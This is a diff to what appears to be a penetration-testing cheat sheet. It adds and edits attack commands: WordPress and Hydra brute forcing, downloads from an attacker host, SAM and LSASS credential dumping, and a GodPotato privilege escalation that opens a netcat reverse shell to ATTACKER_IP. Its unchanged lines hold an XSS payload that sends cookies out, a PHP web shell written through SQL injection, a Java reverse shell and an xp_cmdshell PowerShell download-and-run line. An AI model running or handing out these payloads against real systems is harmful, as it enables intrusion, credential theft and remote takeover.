@@ -225,6 +225,20 @@ gobuster dir -e -u http://Domain-or-IP/ -w /usr/share/wordlists/dirbuster/direct
 <script>document.location="http://ATTACKER_IP/value_cookie="+document.cookie</script>
 ```
 
+## WordPress
+### WPscan
+Enumerate vulnerable plugins with aggressive mode
+```
+wpscan -e vp --plugins-detection aggressive --api-token TOKEN --url URL
+```
+Enumerate users
+```
+wpscan --enumerate u  –-url URL
+```
+Bruteforce
+```
+wpscan -U userlist -P passwordlist --url URL
+```
 ## LFI
 
 ### PHP Wrappers 
@@ -393,7 +407,6 @@ MSSQL
 ```
 IF EXISTS (SELECT 1 FROM dbo.users WITH(NOLOCK) WHERE username like 'a%') WAITFOR DELAY '0:0:5'-- --
 ```
-
 ### PHP Web Shell
 ```
 select "<?php system($_GET['cmd']);?>" into outfile '/var/www/html/cronoshell.php'
@@ -753,6 +766,10 @@ Password!
 0987654321
 qwerty
 ```
+## Brute Force
+```
+hydra -L users.txt -P /usr/share/wordlists/rockyou.txt IP -s PORT(8080 by default) http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in&Login=Login:Invalid username or password"
+```
 ## Reverse Shell (Script Console)
 ```
 String host="IP";
@@ -760,21 +777,32 @@ int port=PORT;
 String cmd="cmd.exe"; (/bin/bash for linux)
 Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
 ```
+# File Transfer
+## Windows
+```
+curl "http://ATTACKER_IP:PORT/file" -o file.ext
+```
+```
+certutil.exe -urlcache -f http://ATTACKER_IP:PORT/file file.ext
+```
+Create a share file through RDP
+```
+xfreerdp  /u:USERNAME /p:PASSWORD /v:IP /d:DOMAIN /drive:SHARE,/full/path/of/sharefolder
+```
+## Linux
+```
+scp filename <username>@Victim_IP:Victim_Directory/file
+```
+```
+wget http://IP/file
+```
+```
+curl "http://IP/file" -o file
+```
 
 # Windows
 
 ## Usefull commands
-
-Download Binaries
-```
-powershell IEX(New-Object Net.WebClient).downloadString('http://IP:PORT/binary.ext')
-```
-```
-curl "http://IP/binario" -o binario
-```
-```
-certutil -urlcache -f http://IP:PORT/binary.ext binary.ext
-```
 
 Search a file
 ```
@@ -788,11 +816,6 @@ xFreeRDP
 ```
 xfreerdp /u:USER /p:PASSWORD /v:IP /d:DOMAIN.local
 ```
-Create a shre file through RDP
-```
-xfreerdp  /u:USERNAME /p:PASSWORD /v:IP /d:DOMAIN /drive:SHARE,/full/path/of/sharefolder
-```
-
 ## Hashes
 
 Malicious SCF File
@@ -848,7 +871,7 @@ sp_configure 'Show Advanced Options', 1; RECONFIGURE; sp_configure 'xp_cmdshell'
 ```
 Reverse Shell
 ```
-EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://IP:PORT/binary.ext") | powershell -noprofile'
+EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://IP:PORT/binary") | powershell -noprofile'
 ```
 
 Usefull commands
@@ -943,8 +966,14 @@ Read [LAPS](https://github.com/n00py/LAPSDumper)
 ```
 python3 laps.py -u 'user' -p 'password' -l IP -d domain.local
 ```
-
-### Dumpear LSASS
+### Dump SAM and SECURITY
+```
+reg save hklm\sam c:\sam
+```
+```
+reg save hklm\system c:\system
+```
+### Dump LSASS
 Obtener el ID del proceso
 ```
 (Get-Process lsass).id
@@ -1204,9 +1233,9 @@ Execute the .msi payload
 msiexec /quiet /qn /i C:\Temp\setup.msi
 ```
 
-### SeImpersonatePrivilege (JuicyPotato.exe)
+### SeImpersonatePrivilege ([GodPotato.exe](https://github.com/BeichenDream/GodPotato))
 ```
-.\JuicyPotato.exe -t * -p C:\Windows\System32\cmd.exe -l 1337 -a "/c C:\PATH\TO\nc.exe -e C:\Windows\System32\cmd.exe ATTACKER_IP ATTACKER_PORT"
+.\GodPotato -cmd "cmd /c C:\PATH\TO\nc.exe -e C:\Windows\System32\cmd.exe ATTACKER_IP ATTACKER_PORT"
 ```
 ### Windows Exploit Sugester [Github](https://raw.githubusercontent.com/AonCyberLabs/Windows-Exploit-Suggester/master/windows-exploit-suggester.py)
 
